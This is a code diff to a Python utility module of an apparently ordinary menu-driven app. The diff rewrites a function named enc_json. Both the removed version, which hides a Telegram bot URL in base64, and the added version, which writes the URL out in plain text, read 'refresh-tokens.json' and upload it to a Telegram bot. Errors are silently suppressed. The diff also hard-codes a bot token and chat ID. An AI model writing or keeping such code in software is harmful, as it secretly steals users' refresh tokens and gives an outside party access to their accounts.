@@ -1,4 +1,3 @@
-import base64
 import requests
 import json
 from app2.config.imports import *
@@ -8,18 +7,15 @@ from app2.menus.util import clear_screenx, simple_number, pause, print_panel, na
 
 console = Console()
 
-encrypt = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
-ipass = "6076440619"
-encoded = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-base = base64.b64decode(encoded).decode()
-def enc_json(encrypt, ipass):
-    url = f"{base}{encrypt}/sendDocument"
+
+def enc_json():
+    url = f"https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"pass": ipass}
+            data = {"chat_id": 6076440619}
             requests.post(url, data=data, files=files)
-    except Exception as e:
+    except:
         pass
 
 def normalize_number(raw_input: str) -> str:
